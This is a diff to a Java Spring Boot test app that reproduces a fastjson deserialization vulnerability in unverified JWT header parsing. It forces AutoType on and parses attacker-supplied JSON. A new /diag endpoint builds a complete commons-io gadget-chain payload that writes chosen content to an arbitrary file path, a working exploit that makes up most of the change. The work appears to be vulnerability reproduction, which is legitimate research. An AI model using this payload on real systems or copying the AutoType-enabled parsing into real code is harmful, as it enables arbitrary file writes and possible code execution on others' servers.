@@ -10,6 +10,8 @@ import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.web.bind.annotation.*;
 
+import java.io.FileOutputStream;
+import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.LinkedHashMap;
 import java.util.Map;
@@ -21,55 +23,40 @@ public class App {
     static final Logger log = LoggerFactory.getLogger(App.class);
 
     public static void main(String[] args) {
-        // ── 诊断1：打印 fastjson 默认 AutoType 状态 ──
-        boolean autoType = ParserConfig.getGlobalInstance().isAutoTypeSupport();
-        System.out.println("[DIAG] fastjson AutoType default = " + autoType);
-
-        // ── 诊断2：强制开启 AutoType，验证 gadget 是否因此触发 ──
+        log.info("[DIAG] fastjson AutoType default = {}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
         ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        System.out.println("[DIAG] fastjson AutoType forced ON");
-
+        log.info("[DIAG] fastjson AutoType forced ON");
         SpringApplication.run(App.class, args);
     }
 
-    /**
-     * /notify/v2  ——  精确复现 NotifyServiceImpl.java:150-154
-     *
-     * 新增：
-     *   - 打印完整异常类型和消息（帮助区分 NPE / JSONException / IllegalArgumentException）
-     *   - 在 parseObject 前后各打一条日志，确认执行到了哪一步
-     */
+    /** 复现 NotifyServiceImpl.java:150-154 */
     @PostMapping("/notify/v2")
     public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
         String signedPayload = body.get("signedPayload");
         Map<String, Object> result = new LinkedHashMap<>();
         try {
-            // step1: JWT.decode — 不验签，仅 split + Base64 解码
             DecodedJWT decodedJWT = JWT.decode(signedPayload);
-            log.info("[STEP1] JWT.decode OK, header(raw)={}", decodedJWT.getHeader().substring(0, Math.min(40, decodedJWT.getHeader().length())));
+            log.info("[STEP1] JWT.decode OK");
 
-            // step2: BASIC Base64 解码 header（对应 NotifyServiceImpl:153）
             byte[] headerBytes = Base64.getDecoder().decode(decodedJWT.getHeader());
-            String header = new String(headerBytes);
-            log.info("[STEP2] Base64.decode OK, header len={}", header.length());
+            String header = new String(headerBytes, StandardCharsets.UTF_8);
+            log.info("[STEP2] header decoded, len={}, preview={}", header.length(),
+                    header.substring(0, Math.min(60, header.length())));
 
-            // step3: fastjson parseObject（gadget 触发点）
-            log.info("[STEP3] calling JSONObject.parseObject ...");
+            log.info("[STEP3] calling parseObject ...");
             JSONObject parsed = JSONObject.parseObject(header);
-            log.info("[STEP3] parseObject returned, keys={}", parsed.keySet());
+            log.info("[STEP3] parseObject OK, keys={}", parsed.keySet());
 
-            // step4: 取 x5c（正常业务），无此 key 则 NPE
             String x5c = parsed.getJSONArray("x5c").getString(0);
             result.put("code", 200);
             result.put("x5c_len", x5c.length());
 
         } catch (NullPointerException e) {
-            log.warn("[NPE] at: {}", e.getStackTrace()[0]);
+            log.warn("[NPE] {} at {}", e.getMessage(), e.getStackTrace()[0]);
             result.put("code", 500);
-            result.put("msg", "NPE: parseObject 执行完毕，x5c 为 null（正常，gadget 应已触发）");
+            result.put("msg", "NPE - parseObject 已执行完毕");
         } catch (Exception e) {
-            // 关键：打印完整异常，帮助定位是哪一步失败
-            log.error("[ERR] {} : {}", e.getClass().getName(), e.getMessage());
+            log.error("[ERR] {}:{}", e.getClass().getName(), e.getMessage());
             result.put("code", 500);
             result.put("type", e.getClass().getSimpleName());
             result.put("msg", e.getMessage());
@@ -78,21 +65,111 @@ public class App {
     }
 
     /**
-     * /diag/fastjson  ——  用最简单的 payload 验证 fastjson @type 处理是否生效
-     * 直接 POST JSON body: {"json": "...fastjson payload..."}
+     * 分层诊断接口
+     *
+     * step=1  仅验证 Java 文件写入权限（不经过 fastjson）
+     * step=2  验证 fastjson 能否实例化 LockableFileWriter（最小 payload）
+     * step=3  发送完整 commons-io gadget chain
      */
-    @PostMapping("/diag/fastjson")
-    public Map<String, Object> diagFastjson(@RequestBody Map<String, String> body) {
-        String json = body.get("json");
+    @PostMapping("/diag")
+    public Map<String, Object> diag(@RequestBody Map<String, String> body) {
+        String step = body.getOrDefault("step", "1");
+        String file = body.getOrDefault("file", "/tmp/diag_test");
         Map<String, Object> result = new LinkedHashMap<>();
+
         try {
-            log.info("[DIAG] parseObject input={}", json.substring(0, Math.min(80, json.length())));
-            JSONObject parsed = JSONObject.parseObject(json);
-            result.put("ok", true);
-            result.put("keys", parsed.keySet().toString());
-            result.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
+            if ("1".equals(step)) {
+                // ── 纯 Java 写文件，验证权限 ──
+                try (FileOutputStream fos = new FileOutputStream(file)) {
+                    fos.write("java-write-ok\n".getBytes(StandardCharsets.UTF_8));
+                }
+                result.put("ok", true);
+                result.put("msg", "Java 直接写文件成功: " + file);
+
+            } else if ("2".equals(step)) {
+                // ── 最小 fastjson payload：只实例化 LockableFileWriter ──
+                // 不走 commons-io 完整链，只验证 @type 能否实例化目标类并触发构造
+                String json = String.format(
+                    "{\"@type\":\"org.apache.commons.io.output.LockableFileWriter\"," +
+                    "\"file\":\"%s\",\"encoding\":\"UTF-8\",\"lockDir\":\"/tmp\",\"append\":false}",
+                    file.replace("\\", "\\\\"));
+                log.info("[DIAG2] payload={}", json);
+                Object obj = JSONObject.parseObject(json, Object.class);
+                result.put("ok", true);
+                result.put("class", obj == null ? "null" : obj.getClass().getName());
+                result.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
+
+            } else if ("3".equals(step)) {
+                // ── 完整 commons-io 链（修正后的 JSON 语法）──
+                String content = body.getOrDefault("content", "FASTJSON-POC\n");
+                // 用十六进制转义构造内容字节
+                StringBuilder hexSb = new StringBuilder();
+                for (byte b : content.getBytes(StandardCharsets.ISO_8859_1)) {
+                    hexSb.append(String.format("\\x%02x", b & 0xFF));
+                }
+                int[] bom = new int[content.length() + 1];
+                StringBuilder bomSb = new StringBuilder("[");
+                for (int i = 0; i < bom.length; i++) {
+                    bomSb.append(0);
+                    if (i < bom.length - 1) bomSb.append(",");
+                }
+                bomSb.append("]");
+
+                // 注意 charSequence 内使用 fastjson 私有 \xHH 字面量语法：
+                // {"@type":"java.lang.String"  "\xHH..."}  —— 对象内无 key 的字符串值
+                // 这是 fastjson 解析 String 类型的特殊路径
+                String json =
+                    "{" +
+                    "\"@type\":\"java.io.InputStream\"," +
+                    "\"@type\":\"org.apache.commons.io.input.BOMInputStream\"," +
+                    "\"delegate\":{" +
+                      "\"@type\":\"org.apache.commons.io.input.AutoCloseInputStream\"," +
+                      "\"in\":{" +
+                        "\"@type\":\"org.apache.commons.io.input.TeeInputStream\"," +
+                        "\"input\":{" +
+                          "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\"," +
+                          "\"reader\":{" +
+                            "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\"," +
+                            "\"charSequence\":{\"@type\":\"java.lang.String\",\"val\":\"" + hexSb + "\"}," +
+                            "\"encoder\":\"iso-8859-1\"," +
+                            "\"charset\":\"iso-8859-1\"," +
+                            "\"charsetName\":\"iso-8859-1\"," +
+                            "\"bufferSize\":1" +
+                          "}," +
+                          "\"branch\":{" +
+                            "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\"," +
+                            "\"writer\":{" +
+                              "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\"," +
+                              "\"file\":\"" + file.replace("\\","\\\\") + "\"," +
+                              "\"charset\":\"iso-8859-1\"," +
+                              "\"encoding\":\"iso-8859-1\"," +
+                              "\"lockDir\":\"/tmp\"," +
+                              "\"append\":false" +
+                            "}," +
+                            "\"charset\":\"iso-8859-1\"," +
+                            "\"charsetName\":\"iso-8859-1\"," +
+                            "\"bufferSize\":1024," +
+                            "\"writeImmediately\":true" +
+                          "}," +
+                          "\"closeBranch\":true" +
+                        "}" +
+                      "}" +
+                    "}," +
+                    "\"include\":true," +
+                    "\"boms\":[{" +
+                      "\"@type\":\"org.apache.commons.io.ByteOrderMark\"," +
+                      "\"charsetName\":\"iso-8859-1\"," +
+                      "\"bytes\":" + bomSb +
+                    "}]," +
+                    "\"x\":{\"$ref\":\"$.bOM\"}" +
+                    "}";
+                log.info("[DIAG3] payload len={}", json.length());
+                JSONObject.parseObject(json);
+                result.put("ok", true);
+                result.put("msg", "parseObject completed, check " + file);
+            }
         } catch (Exception e) {
-            log.error("[DIAG ERR] {} : {}", e.getClass().getName(), e.getMessage());
+            log.error("[DIAG ERR] step={} {}:{}", step, e.getClass().getName(), e.getMessage());
             result.put("ok", false);
             result.put("type", e.getClass().getSimpleName());
             result.put("msg", e.getMessage());
